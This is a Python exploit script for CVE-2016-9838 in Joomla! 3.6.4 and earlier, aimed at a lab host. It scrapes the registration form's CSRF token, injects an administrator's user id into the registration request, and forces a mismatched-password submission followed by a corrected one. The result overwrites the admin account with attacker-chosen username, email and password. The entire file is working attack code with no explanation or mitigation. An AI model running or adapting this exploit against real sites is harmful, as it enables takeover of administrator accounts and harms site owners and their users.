#!/usr/bin/python3
# CVE-2016-9838: Joomla! <= 3.6.4 Admin TakeOver
# cf

import bs4
import requests
import random


ADMIN_ID = 384
url = 'http://vmweb.lan/Joomla-3.6.4/'

form_url = url + 'index.php/component/users/?view=registration'
action_url = url + 'index.php/component/users/?task=registration.register'

username = 'user%d' % random.randrange(1000, 10000)
email = username + '@yopmail.com'
password = 'ActualRandomChimpanzee123'

user_data = {
    'name': username,
    'username': username,
    'password1': password,
    'password2': password + 'XXXinvalid',
    'email1': email,
    'email2': email,
    'id': '%d' % ADMIN_ID
}

session = requests.Session()

# Grab original data from the form, including the CSRF token

response = session.get(form_url)
soup = bs4.BeautifulSoup(response.text, 'lxml')

form = soup.find('form', id='member-registration')
data = {e['name']: e['value'] for e in form.find_all('input')}

# Build our modified data array

user_data = {'jform[%s]' % k: v for k, v in user_data.items()}
data.update(user_data)

# First request will get denied because the two passwords are mismatched

response = session.post(action_url, data=data)

# The second will work

data['jform[password2]'] = data['jform[password1]']
del data['jform[id]']
response = session.post(action_url, data=data)

print("Account modified to user: %s [%s]" % (username, email))